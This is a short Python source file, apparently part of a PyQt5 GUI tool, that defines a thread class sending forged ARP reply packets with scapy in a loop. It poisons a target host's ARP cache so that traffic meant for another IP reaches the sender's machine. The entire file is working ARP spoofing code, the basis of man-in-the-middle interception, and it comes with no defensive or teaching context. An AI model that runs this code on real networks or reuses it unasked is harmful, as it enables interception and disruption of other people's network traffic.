#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from PyQt5 import QtCore
from scapy.all import (ARP, Ether, sendp)


class PoisonThread(QtCore.QThread):
    def __init__(self, localMac, deceiveIp, pktRecvMac, pktRecvIp,
                 parent=None):
        super().__init__(parent)
        self.localMac = localMac
        self.deceiveIp = deceiveIp
        self.pktRecvMac = pktRecvMac
        self.pktRecvIp = pktRecvIp
        self.startFlag = True

    def run(self):
        pkt = Ether(
            src=self.localMac, dst=self.pktRecvMac) / ARP(
                hwsrc=self.localMac,
                psrc=self.deceiveIp,
                hwdst=self.pktRecvMac,
                pdst=self.pktRecvIp,
                op=2)
        while self.startFlag:
            sendp(pkt, inter=1, count=20)
